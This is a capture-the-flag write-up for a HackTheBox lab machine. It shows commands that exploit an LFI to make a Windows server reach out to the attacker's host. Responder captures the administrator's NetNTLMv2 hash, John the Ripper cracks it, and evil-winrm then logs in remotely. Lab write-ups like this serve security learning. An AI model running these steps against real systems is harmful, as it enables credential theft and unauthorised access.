#-Starting-Point
#-HTB 

---

##### We will use a  utility called Responder to capture a NetNTLMv2 hash and later use a utility known as john the ripper to test millions of potential passwords to see if they match the one used to create the hash.

---

First I set up the openvpn connection with HackTheBox.
```
sudo openvpn starting-point.ovpn
```

I set the IP Address of the machine to a local variable, that will be deleted with the terminal.
```
IP=10.129.222.220
```

Then I tried to connect to the website using the IP address on FireFox. This failed.

So, I then added the IP address and the redirected site name to the file /etc/hosts
```
sudo vim /etc/hosts
```

This could have also been done like so:
```
echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
```

Now I could access the website using the IP address.
Using Wappalyzer, I can see that the programming language used for the website is PHP.

When checking the different language URLs, there is a PHP request shown:
```
http://unika.htb/index.php?page=french.html
```

Because this is accessing a file, there may be an Local File Inclusion (LFI) vulnerability.
Here is what an [LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) is, and how to check for them.

The acronym NTLM stand for New Technology LAN Manager.
An [NTLM](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/) is a version of client authentication present on some servers. 

Microsoft employs NTLM & Kerberos for authentication services.

[Responder](https://www.kali.org/tools/responder/) is a tool that can be used to redirect to a network.
In this scenario it can be used for the NTLM challenge / response protocols.
The *-I* flag specifies the desired Network in the command line.

[John (the Ripper)](https://www.kali.org/tools/john/) is a tool used to check for weak or insecure passwords.

Running the Git cloned Responder tool failed on the Machine.
However, using the preinstalled Kali Version of Responder, the command worked:
```
sudo responder -I tun0
```

With an SMB request, we can specify the webpage to request access to our machine:
```
http://unika.htb/?page=//10.10.15.114/home/kali/mitm
```

This will fail and give use an error; however, the permission denied will capture the hashed password of the administrator from the running Responder command.

I then copied the full hashed password line and saved it to a file using echo > hash.txt

This hash can now be cracked using John the Ripper:
```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

I needed to get the rockyou.txt file by installing [wordlists](https://www.kali.org/tools/wordlists/).

The password was found almost instantly: badminton

We can now connect to the windows machine from Kali Linux by using [EvilWinRM](https://github.com/Hackplayers/evil-winrm).
```
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

The list of users can be found by using the command:
```
cd C:\Users
```

From here, we found a user named Mike.
We can check Mike's files by using the command:
```
dir C:\Users\Mike\Desktop
```

Mike has a file called flag.txt on the Desktop. Interesting.
The contents of this file can be checked on the Windows machine like this:
```
type C:\Users\Mike\Desktop\flag.txt
```

And with this, the challenge is done!

---

On this machine, we found a LFI vulnerability.
This is where web pages are loaded based on a local file on the server.
Windows uses NTLM or Kerberos for client authentication.
NTLM basically uses a challenge and response authentication technique.
Responder is a listener tool that can capture authentication traffic.
Using this tool, the hashed password for the server administrator was captured.
John the Ripper is a password cracking tool that can be used on hashed passwords to attempt to brute force the decryption.
Using John the Ripper on the administrators hashed password resulted in the plaintext password.
Now with this login information, we can exploit remote connection to the machine.
Because the machine runs on Windows, and we are locally running Kali Linux, we can use the evil-winrm command to connect to the IP with a username and password.
Now connected, we can explore the machine for files.
Going to the C:\\Users directory we can find a list of Users on the machine.
From here, we see a User named Mike.
With Administrator level permissions, we can explore Mike's file to find the flag.txt